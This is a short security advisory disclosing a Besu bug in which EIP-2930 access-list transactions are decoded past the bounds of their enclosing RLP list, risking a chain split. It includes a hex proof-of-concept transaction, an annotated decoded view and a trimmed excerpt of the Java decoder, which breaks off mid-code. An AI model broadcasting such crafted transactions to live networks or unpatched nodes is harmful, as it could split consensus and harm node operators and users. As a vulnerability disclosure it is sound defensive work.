# [M] EL-2026-12: Incorrect transaction RLP decoding

## Summary
Severity: Medium
Chain: Ethereum (execution layer)
Component: Besu
Source: https://notes.ethereum.org/P1KdsCjiStqzP2PI8YXofg
Type: ef-disclosure

## Details
Besu incorrect transaction RLP decoding leading to potential chain split.

ISSUE 0
Transactions types that may carry EIP2930 access lists allows access outside of enclosing list. If the list has no elements we will not fail
bounds checking of the elements within the list either.

RLP POC:
01f8410130308330303080308430303030d6d5943030303030303030303030303030303030303030c0808230309630303030303030303030303030303030303030303030
RLP JSON:
[
"0x01",
"0x30",
"0x30",
"0x303030",
"0x",
"0x30",
"0x30303030",
[["0x3030303030303030303030303030303030303030"]],[], <--- THIS WILL BE TREATED AS THE SLOT LIST EVEN THOUGH IT'S OOB.
"0x",
"0x3030",
"0x30303030303030303030303030303030303030303030"
]

RELEVANT CODE:
class AccessListTransactionDecoder {
  private static final Supplier<SignatureAlgorithm> SIGNATURE_ALGORITHM =
      Suppliers.memoize(SignatureAlgorithmFactory::getInstance);

  public static Transaction decode(final RLPInput rlpInput) {
    rlpInput.enterList();
    final Transaction.Builder preSignatureTransactionBuilder =
        Transaction.builder()
            .type(TransactionType.ACCESS_LIST)
            .chainId(BigInteger.valueOf(rlpInput.readLongScalar()))
            .nonce(rlpInput.readLongScalar())
            .gasPrice(Wei.of(rlpInput.readUInt256Scalar()))
            .gasLimit(rlpInput.readLongScalar())
            .to(

_Trimmed to 38 lines — full report: https://notes.ethereum.org/P1KdsCjiStqzP2PI8YXofg_
